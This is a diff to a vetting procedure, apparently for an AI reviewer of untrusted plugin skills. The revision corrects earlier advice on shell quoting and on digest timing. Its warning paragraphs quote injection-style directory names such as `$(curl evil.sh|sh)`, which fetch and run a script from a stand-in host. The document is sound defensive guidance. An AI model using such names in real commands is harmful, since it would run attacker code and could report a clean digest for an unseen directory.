@@ -128,12 +128,22 @@ Write one of: **SAFE-TO-PROPOSE / SUSPECT / BLOCK**, with the evidence behind it
   copy via `${CLAUDE_PLUGIN_ROOT}`, or a separate user-level install you
   control (e.g. under `~/.local/`) that is not the vetted checkout:
 
-  **QUOTE every placeholder you substitute.** The candidate's directory NAME is
-  attacker-chosen too, not just its contents: a directory named `x;curl evil.sh|sh`
-  is a legal name, and substituting it bare into a shell command runs it — at your
-  privilege, before you have read one byte of the candidate. Quoting the path is
-  what stops that; it is the same hazard as the untrusted-`$TOOL` path above,
-  reached through the name instead of the tool.
+  **KNOWN UNFIXED HAZARD — read this before running anything below.** The
+  candidate's directory NAME is attacker-chosen, not just its contents, and a
+  name like `$(curl evil.sh|sh)` or ``x`id` `` is legal. Substituting such a name
+  into a shell command RUNS it, at your privilege, before you have read one byte
+  of the candidate. **Quoting does not fix this.** An earlier revision of this
+  file claimed double quotes stopped it; they stop `;` and nothing else — not
+  `$(...)`, not backticks, not `${...}`, not an embedded `"`. Worse, a name of
+  the form `$(payload; echo other-skill)` both runs the payload AND rewrites the
+  path to `other-skill`, so the tool then reports a clean digest for a directory
+  you never looked at.
+
+  Until the shell-free addressing described in
+  `reviews/2026-07-25-skill-vetting-round8-design.md` (D1) is implemented:
+  **if the candidate's directory name is not a plain
+  `[A-Za-z0-9][A-Za-z0-9._-]*` identifier, do not put it in a shell command at
+  all — record BLOCK and say why.** A hostile name is itself strong evidence.
 
   ```bash
   # $TOOL = a trusted copy OUTSIDE the candidate, e.g.
@@ -149,8 +159,13 @@ Write one of: **SAFE-TO-PROPOSE / SUSPECT / BLOCK**, with the evidence behind it
   vetting `policy` version, and any observation anomalies; it exits non-zero
   on an anomalous tree, and an anomalous tree can never be SAFE-TO-PROPOSE
   (fail closed). Record the verdict against the digest you actually reviewed
-  (the `--reviewer` note carries the reviewing model/tool identities and date;
-  `--expect-digest` refuses if the tree changed since you read it):
+  (the `--reviewer` note carries the reviewing model/tool identities and date).
+  **`--expect-digest` refuses only if the tree changed since the `digest` RUN
+  whose output you are passing — NOT since you read the source.** The steps
+  above put the read first and the digest last, so a change made during your
+  read is invisible to it. Until D4's export-then-review lands, run `digest`
+  BEFORE the full read as well, and re-run it after: two matching digests
+  bracket the read window, one does not:
 
   ```bash
   python3 "$TOOL" record --scope "<global|proj:PATH>" --name "<dir-name>" \
